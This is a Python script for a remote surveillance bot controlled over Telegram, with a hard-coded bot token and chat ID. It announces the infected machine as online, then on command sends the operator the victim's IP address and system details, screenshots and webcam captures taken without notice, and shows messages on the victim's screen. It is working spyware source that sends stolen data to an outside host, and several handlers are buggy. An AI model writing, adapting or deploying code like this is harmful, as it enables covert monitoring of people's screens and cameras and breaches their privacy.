import os
import ctypes
import time

import requests
import cv2
import pyautogui as pag
import platform as pf

import telebot
from telebot import types

TOKEN_BOT = "5666691121:AAETlP9uNF_cu_hlE1IRu2AA8lwMI_DNgKw"
CHAT_ID = "1406385208"
client = telebot.TeleBot(TOKEN_BOT)

requests.post(f" https://api.telegram.org/bot{TOKEN_BOT}/sendMessage?chat_id={CHAT_ID}&text=Online")

@client.message_handler(commands=["start"])
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["/ip", "/spec", "/screenshot", "/webcam", "/message", "/input", "/wallpaper"]

    for btn in btns:
        rmk.add(types.KeyboardButton(btn))
    
    client.send_message(message.chat.id, "Выберите действие:", reply_markup=rmk)

@client.message_handler(commands=['ip', "ip_address"])
def ip_address(message):
    response = requests.get("http://jsonip.com/").json()
    client.send_message(message.chat.id, f"IP adderss: {response['ip']}")

@client.message_handler(commands=["spec", "specifications"])
def spec(message):
    msg = f"Name PC: {pf.node()}\nProcressor: {pf.processor()}\nSystem: {pf.system()} {pf.release()}"
    client.send_message(message.chat.id, msg)

@client.message_handler(commands=["screenshot"])
def screenshot(message):
    pag.screenshot("000.jpg")

    with open("000.jpg", "rb") as img:
        client.send_photo(message.chat.id, img)

@client.message_handler(commands=["webcam"])
def webcam(message):
    cap = cv2.VideoCapture(0)

    for i in range(30):
        cap.read()

    ret, frame = cap.read()

    cv2.imwrite("cam.jpg", frame)
    cap.release()

    with open("cam.jpg", "rb") as img:
        client.send_photo(message.chat.id, img)

@client.message_handler(commands=["message"])
def message_sending(message):
    msg = client.send_message(message.chat.id, "Введите сообщение которое хотите вывести на экран:")
    client.register_next_step_handler(msg, next_message_sending)

def next_message_sending(message):
    try:
        pag.alert(message.text, "~")
    except Exception:
        client.send_message(message.chat.id, "Что-то пошло не так...")


@client.message_handler(commands=["input"])
def message_sending_with_input(message):
    msg = client.send_message(message.chat.id, "Введите сообщение которое хотите вывести на экран:")
    client.register_next_step_handler(msg, next_message_sending)

def next_message_sending_with_input(message):
    try:
        answer = pag.prompt(message.text, "~")
        client.send.message(message.chat.id, answer )
    except Exception:
        client.send_message(message.chat.id, "Что-то пошло не так...")

@client.message_handler(commands=["wallpaper"])

def wallpaper(message):
    msg = client.send_message(message.chat.id, "Отправьте картинку или ссылку")
    client.register_next_step_handler(msg, next_wallpaper)

@client.message_handler(content_types=["text","photo"])
def next_wallpaper(message):
    if "http" or "https" in message.text:
        pass
    else:
        file = message.photo[-1].file_id
        file = client.get_file(file)
        dfile = client.download_file(file.file_path)

        with open("image.jpg", "wb") as img:
            img.write(dfile)

        path = os.path.abspath("image.jpg")
        ctypes.windll.user32.SystemParametrsInfoW(20, 0, path, 0)

client.polling()